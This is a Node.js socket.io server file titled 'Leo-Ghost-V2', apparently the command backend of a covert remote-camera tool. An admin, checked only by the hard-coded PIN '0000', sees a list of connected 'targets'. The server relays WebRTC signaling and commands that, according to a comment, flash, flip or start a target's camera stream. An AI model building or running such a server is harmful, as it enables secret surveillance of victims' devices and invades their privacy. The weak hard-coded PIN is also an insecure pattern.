const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

let adminSocketId = null;

io.on('connection', (socket) => {
    console.log('User Connected:', socket.id);

    // Jab Admin join kare (Pin check)
    socket.on('admin-join', (pin) => {
        if (pin === "0000") {
            adminSocketId = socket.id;
            socket.emit('admin-status', { success: true });
            console.log("Admin Authorized:", socket.id);
            
            // Sabhi active targets ki list Admin ko bhejna
            updateAdminTargetList();
        } else {
            socket.emit('admin-status', { success: false });
        }
    });

    // Jab Target join kare
    socket.on('target-join', () => {
        socket.join('targets');
        console.log("Target Added to Pool:", socket.id);
        updateAdminTargetList();
    });

    // Signaling: Admin se Target ya Target se Admin
    socket.on('signal', (data) => {
        // data.to mein hum socket id bhejenge
        io.to(data.to).emit('signal', {
            from: socket.id,
            signal: data.signal
        });
    });
    // Commands: Flash, Flip, ya Start Stream
    socket.on('command', (data) => {
        io.to(data.targetId).emit('command', {
            cmd: data.cmd,
            adminId: socket.id
        });
    });

    socket.on('disconnect', () => {
        if (socket.id === adminSocketId) {
            adminSocketId = null;
        }
        updateAdminTargetList();
    });
});

function updateAdminTargetList() {
    if (adminSocketId) {
        // 'targets' room mein jitne bhi log hain unki list nikalo
        const targetSockets = io.sockets.adapter.rooms.get('targets');
        const list = targetSockets ? Array.from(targetSockets) : [];
        io.to(adminSocketId).emit('update-targets', list);
    }
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Leo-Ghost-V2 Server running on ${PORT}`));
